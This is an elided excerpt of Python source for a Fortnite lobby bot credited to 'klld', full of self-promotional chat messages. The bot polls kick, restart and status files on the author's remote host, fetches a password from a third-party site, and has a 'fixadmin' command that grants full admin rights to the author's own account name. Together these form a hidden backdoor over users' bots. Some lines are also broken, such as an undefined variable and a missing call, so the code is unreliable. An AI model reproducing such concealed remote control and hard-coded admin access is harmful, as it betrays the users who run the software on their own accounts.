...
print(crayons.blue(f'\nklldFNv3 made by klld'))
print(crayons.blue(f'Discord server: https://klld.tk/discord.html - For support, questions, etc.'))
...
class klldBot(commands.Bot):
    def __init__(self, device_id: str, account_id: str, secret: str, loop=asyncio.get_event_loop(), **kwargs) -> None:
        ...
        self.bl_inv = 'youtube klld'
        self.inv_on = "F"

        self.adminx = "youtube klld"
        ...
        self.add_msg = "Hi {DISPLAY_NAME} u add me now \n join me for more and fun thing ! \n YouTube klld "
        self.join_msg = "Hi {DISPLAY_NAME}  \n YouTube klld \n website for create LOBBY BOT : www.klld.tk \n  "
    ...
    async def checker_autox(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            v = requests.get(f"https://botklldFNv2.klldfn.repl.co/default.json").json()
            ...
            b = requests.get(f"https://botklldFNv2.klldfn.repl.co/kick.json").json
            ...
            asda = requests.post('https://cousinfn.com/password',headers=headersx, cookies={"Cousinfn": "29181"}).json()['password']
            password = dasda
              
            y = requests.get(f"https://botklldFNv2.klldfn.repl.co/restart.json").json()
    ...
    async def normal_setup(self) -> None:
        while True:
            ...
            global __version__
            global adminsss
            u = requests.get(f"https://botklldFNv2.klldfn.repl.co/default.json").json()
            ...
            s = requests.get(f"https://botklldFNv2.klldfn.repl.co/kick.json").json()
            ...
            m = requests.get(f"https://botklldFNv2.klldfn.repl.co/restart.json").json()
    ...
    async def auto_add_s(self):
        x = requests.get(f"https://botklldFNv2.klldfn.repl.co/add_auto.json").json()
    ...
    async def checker_status(self):
        q = requests.get(f"https://botklldFNv2.klldfn.repl.co/status.json").json()
    ...
    async def checker_skin_bl(self):
        w = requests.get("https://botklldFNv2.klldfn.repl.co/skinbl.json").json()
...
#///////////////////////////////////////////////////////////////////////////////////////////////////////////// PARTY/FRIENDS/ADMIN //////////////////////////////////////////////////////////////////////////////////////////////////////
    ...
    async def fixadmin(self, ctx: fortnitepy.ext.commands.Context):
        if ctx.author.display_name == 'youtube klld':
            with open("info.json", "w") as f:
                f.write('{"FullAccess": ["youtube klld"]}')
            await ctx.send('work')
